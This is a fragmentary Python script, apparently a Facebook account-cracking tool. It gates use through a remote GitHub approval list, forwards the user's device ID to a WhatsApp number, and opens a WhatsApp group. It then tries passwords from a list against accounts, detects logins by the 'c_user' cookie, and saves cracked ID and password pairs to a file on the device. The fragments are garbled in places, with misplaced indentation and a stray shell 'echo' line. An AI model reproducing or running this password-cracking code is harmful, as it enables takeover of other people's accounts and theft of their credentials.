...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get(f'https://github.com/CHUTTA1/Fil/blob/main/Active.txt').text
...
echo "  
  ...
  try:
    httpCaht = requests.get(f"https://github.com/CHUTTA1/Fil/blob/main/Active.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+940781782648?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	...
    	menu_apikey()
#menu_apikey()
os.system('xdg-open https://chat.whatsapp.com/BHz56rPtqqv6M135wpW4Ql')
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [ PREKARSHA-CP ] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/PREKARSHA.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
